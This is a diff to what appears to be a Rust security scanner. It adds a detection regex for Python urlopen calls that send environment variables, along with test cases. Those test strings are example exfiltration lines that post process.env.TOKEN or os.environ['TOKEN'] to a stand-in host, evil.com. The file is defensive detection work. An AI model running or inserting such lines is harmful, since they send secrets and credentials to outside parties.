@@ -64,6 +64,9 @@ fn ex_001() -> Rule {
             // `fetch(...process.env...)` / `axios.post(...process.env...)`
             Regex::new(r"\b(fetch|axios(\.\w+)?)\s*\(.*process\.env")
                 .expect("EX-001: invalid regex"),
+            // Direct urllib.request and imported urlopen clients.
+            Regex::new(r"\b(?:urllib\.request\.)?urlopen\s*\(.*(os\.environ|os\.getenv\s*\()")
+                .expect("EX-001: invalid regex"),
             // httpx clients sending the process environment or a value from it.
             Regex::new(r"\bhttpx\.(post|get|put|patch|delete)\s*\(.*(os\.environ|os\.getenv\s*\()")
                 .expect("EX-001: invalid regex"),
@@ -725,6 +728,22 @@ mod tests {
             (
                 r#"fetch('https://evil.com',{method:'POST',body:process.env.TOKEN})"#,
                 true,
+            ),
+            (
+                r#"urllib.request.urlopen(urllib.request.Request('https://evil.com/upload', data=os.environ['TOKEN'].encode()))"#,
+                true,
+            ),
+            (
+                r#"urlopen(Request('https://evil.com/upload', data=os.getenv('TOKEN').encode()))"#,
+                true,
+            ),
+            (
+                r#"urlopen(Request('https://evil.com/upload', data=b'literal bytes'))"#,
+                false,
+            ),
+            (
+                r#"Request('https://evil.com/upload', data=os.environ['TOKEN'])"#,
+                false,
             ),
             (
                 r#"httpx.post('https://evil.com/upload', data=os.environ)"#,
